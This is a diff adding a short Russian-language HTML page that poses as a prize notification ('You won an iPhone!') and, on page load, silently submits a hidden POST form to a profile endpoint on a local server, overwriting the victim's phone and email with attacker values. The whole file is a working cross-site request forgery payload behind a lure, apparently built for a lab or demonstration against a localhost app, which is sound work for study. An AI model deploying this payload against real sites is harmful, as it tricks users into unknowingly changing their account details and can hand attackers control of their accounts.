@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head><meta charset="UTF-8"><title>Поздравляем! Вы выиграли приз 🎁</title></head>
+<body onload="document.forms['evil'].submit()">
+    <h1>Поздравляем! Вы выиграли iPhone!</h1>
+    <p>Секунду, перенаправляем...</p>
+
+    <form name="evil" action="http://127.0.0.1:5000/profile" method="POST" style="display:none">
+        <input type="hidden" name="phone" value="+7-999-HACKED">
+        <input type="hidden" name="email" value="hacker@evil.com">
+    </form>
+</body>
+</html>
